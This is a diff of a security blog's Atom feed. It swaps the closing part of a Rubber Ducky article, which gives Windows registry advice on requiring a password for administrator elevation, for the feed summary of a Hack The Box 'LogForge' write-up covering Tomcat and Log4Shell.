-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/XHTN8yI43UU&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-
-&lt;h2 id=&quot;how-to-mitigate-this-type-of-attacks&quot;&gt;How to mitigate this type of attacks?&lt;/h2&gt;
-
-&lt;p&gt;As we have seen, some of these attacks need administrator permission to be able to run and some people (and if not say the most of people) do not enable the option of requiring the password to run a program as administrator. And the attackers can take advantage of vulnerability.&lt;/p&gt;
-
-&lt;p&gt;To enable this option we will go to the windows registry editor, and here we have to &lt;strong&gt;&lt;em&gt;be careful&lt;/em&gt;&lt;/strong&gt; what we modify since it directly affects the system. In this case we are going to the following path that is showing in the image, and we click on &lt;strong&gt;&lt;em&gt;ConsentPromptBehaviorAdmin&lt;/em&gt;&lt;/strong&gt; and in the value option we are going to put &lt;strong&gt;&lt;em&gt;1&lt;/em&gt;&lt;/strong&gt; that will enable this option.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/registry.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And now if we are going to run a program as administrator it will ask us for the password. AND PLEASE DO NOT PUT A TYPICAL PASSWORD THAT IS EASY TO GUESS!!🤬.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/password.png&quot; /&gt;
-&lt;/p&gt;</content><author><name>Nafsu Uddin | AKA bynafrez</name></author><category term="Rubber ducky" /><category term="Linux" /><summary type="html">Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will create some payloads and attacks that we can done and how to mitigate these types of attacks.</summary></entry></feed>
+&lt;/p&gt;</content><author><name>Nafsu Uddin | AKA bynafrez</name></author><category term="Hack the box" /><category term="Linux" /><category term="CVE" /><category term="RCE" /><summary type="html">LogForge is a linux machine with a medium level of difficulty both in the exploitation phase and the privileges escalation, in this machine we take advantage of the vulnerability of the apache tomcat service to have access to the manager panel and we will also be exploiting a very critical vulnerability that has just been released recently which is the log4shell.</summary></entry></feed>
